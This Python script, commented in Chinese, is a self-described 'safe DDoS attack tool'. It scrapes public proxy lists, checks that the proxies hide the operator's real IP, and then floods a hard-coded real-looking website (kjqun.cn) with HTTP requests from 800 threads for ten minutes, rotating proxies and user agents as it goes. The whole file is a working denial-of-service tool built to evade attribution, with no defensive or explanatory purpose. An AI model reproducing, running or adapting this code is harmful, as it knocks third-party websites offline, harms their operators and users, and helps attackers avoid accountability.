#!/usr/bin/env python3
"""
安全DDoS攻击工具 - 确保攻击流量通过代理，保护真实IP
解决攻击反噬问题
"""

import requests
import threading
import time
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor

class SafeDDoSAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.working_proxies = []
        self.attack_count = 0
        self.success_count = 0
        
    def collect_and_test_proxies(self):
        """收集并测试大量可用代理"""
        print("🔍 收集和测试代理...")
        
        # 多个免费代理源
        proxy_sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
        ]
        
        all_proxies = set()
        
        # 收集代理
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy.strip() and ':' in proxy:
                            all_proxies.add(proxy.strip())
                    print(f"✅ 从 {source.split('/')[-1]} 获取 {len(proxies)} 个代理")
            except:
                pass
        
        print(f"📊 总共收集到 {len(all_proxies)} 个代理")
        
        # 快速测试代理可用性
        def test_proxy(proxy):
            try:
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=3)
                if response.status_code == 200:
                    return proxy
            except:
                pass
            return None
        
        # 并行测试
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(test_proxy, list(all_proxies)))
        
        self.working_proxies = [proxy for proxy in results if proxy]
        print(f"✅ 可用代理数量: {len(self.working_proxies)}")
        
        # 保存到文件
        if self.working_proxies:
            with open('files/proxies/safe_proxies.txt', 'w', encoding='utf-8') as f:
                for proxy in self.working_proxies:
                    f.write(f"http://{proxy}\n")
            print("💾 安全代理文件已保存")
        
        return len(self.working_proxies) > 100  # 至少需要100个可用代理
    
    def verify_proxy_protection(self):
        """验证代理保护效果"""
        print("🔒 验证代理保护效果...")
        
        if not self.working_proxies:
            print("❌ 没有可用代理，无法验证保护效果")
            return False
        
        # 测试真实IP
        try:
            response = requests.get('http://httpbin.org/ip', timeout=5)
            real_ip = response.json().get('origin', '未知')
            print(f"📡 您的真实IP: {real_ip}")
        except:
            print("⚠️ 无法获取真实IP")
            real_ip = "未知"
        
        # 测试通过代理的IP
        test_proxy = random.choice(self.working_proxies)
        try:
            proxies = {'http': f'http://{test_proxy}', 'https': f'http://{test_proxy}'}
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            proxy_ip = response.json().get('origin', '未知')
            print(f"🔗 通过代理的IP: {proxy_ip}")
            
            if proxy_ip != real_ip:
                print("✅ 代理保护验证成功 - 真实IP已隐藏")
                return True
            else:
                print("❌ 代理保护验证失败 - 真实IP未隐藏")
                return False
        except:
            print("❌ 代理测试失败")
            return False
    
    def safe_http_flood(self, threads=500, duration=300):
        """安全的HTTP洪水攻击 - 通过代理保护真实IP"""
        print(f"🚀 启动安全HTTP洪水攻击")
        print(f"🎯 目标: {self.target_url}")
        print(f"⚡ 线程数: {threads}")
        print(f"⏱️ 持续时间: {duration}秒")
        print(f"🔗 使用代理: {len(self.working_proxies)}个")
        
        if len(self.working_proxies) < 50:
            print("⚠️ 警告: 可用代理不足，攻击效果可能受限")
        
        self.attack_count = 0
        self.success_count = 0
        start_time = time.time()
        
        def attack_thread(thread_id):
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            
            for i in range(max(10, duration * 2)):
                try:
                    # 随机选择代理
                    proxy = random.choice(self.working_proxies)
                    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                    
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'
                    }
                    
                    response = requests.get(self.target_url, headers=headers, proxies=proxies, timeout=3)
                    self.attack_count += 1
                    self.success_count += 1
                    
                    # 每100个请求更换代理
                    if i % 100 == 0:
                        proxy = random.choice(self.working_proxies)
                    
                except requests.exceptions.Timeout:
                    self.attack_count += 1
                except requests.exceptions.ConnectionError:
                    self.attack_count += 1
                except:
                    self.attack_count += 1
                
                # 定期报告
                if self.attack_count % 500 == 0:
                    elapsed = time.time() - start_time
                    rate = self.attack_count / elapsed if elapsed > 0 else 0
                    success_rate = (self.success_count / self.attack_count * 100) if self.attack_count > 0 else 0
                    print(f"📊 已发送 {self.attack_count} 请求 | 成功率: {success_rate:.1f}% | 速率: {rate:.1f} req/s")
        
        # 启动攻击线程
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # 启动所有线程
            futures = [executor.submit(attack_thread, i) for i in range(threads)]
            
            # 等待指定时间
            time.sleep(duration)
            
            # 取消未完成的线程
            for future in futures:
                future.cancel()
        
        # 统计结果
        elapsed = time.time() - start_time
        success_rate = (self.success_count / self.attack_count * 100) if self.attack_count > 0 else 0
        request_rate = self.attack_count / elapsed if elapsed > 0 else 0
        
        print("\n" + "="*50)
        print("📊 安全DDoS攻击统计")
        print("="*50)
        print(f"🎯 目标网站: {self.target_url}")
        print(f"⏱️ 攻击时长: {elapsed:.1f}秒")
        print(f"📨 总请求数: {self.attack_count}")
        print(f"✅ 成功请求: {self.success_count}")
        print(f"📈 成功率: {success_rate:.1f}%")
        print(f"⚡ 请求速率: {request_rate:.1f} req/s")
        print(f"🔗 使用代理: {len(self.working_proxies)}个")
        
        # 安全验证
        print("\n🔒 安全验证:")
        if success_rate > 0 and request_rate > 50:
            print("✅ 攻击成功且安全 - 真实IP已保护")
        else:
            print("⚠️ 攻击效果有限，但安全保护正常")
    
    def start_safe_attack(self):
        """启动完整的安全攻击流程"""
        print("="*60)
        print("🛡️ 安全DDoS攻击启动")
        print("="*60)
        
        # 1. 收集代理
        if not self.collect_and_test_proxies():
            print("❌ 代理收集失败，无法进行安全攻击")
            return
        
        # 2. 验证保护效果
        if not self.verify_proxy_protection():
            print("⚠️ 代理保护效果验证失败，继续攻击但风险较高")
        
        # 3. 启动安全攻击
        print("\n💥 开始安全DDoS攻击...")
        self.safe_http_flood(threads=800, duration=600)  # 800线程，10分钟

def main():
    target = "https://www.kjqun.cn/"
    
    # 创建安全攻击实例
    attacker = SafeDDoSAttack(target)
    
    # 启动安全攻击
    attacker.start_safe_attack()

if __name__ == "__main__":
    main()